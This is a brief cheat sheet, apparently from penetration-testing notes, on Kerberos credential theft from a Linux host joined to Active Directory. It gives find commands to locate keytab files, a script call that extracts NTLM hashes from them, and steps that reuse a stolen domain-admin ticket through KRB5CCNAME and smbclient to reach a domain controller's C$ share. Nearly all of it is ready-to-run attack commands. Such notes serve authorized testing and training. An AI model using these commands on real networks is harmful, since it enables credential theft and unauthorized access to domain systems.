
Other file extensions maybe in use

Locating `keytab` files

```bash
find / -name *keytab* -ls 2>/dev/null
find / -name *kt* -ls 2>/dev/null
```

Extracting NTLM hashes from the keytab

```bash
python3 /opt/keytabextract.py <FILE_NAME>.keytab
```

Kerberos tickets (ccache files) are by default stored in the `/tmp` directory

If lucky enough to find a ticket for a DA, we can do the following:

```bash
export KRB5CCNAME=<ticket_name>
smbclient //dc01/C$ -k --no-pass
smbclient //dc01/C$ -k --no-pass -c ls
```

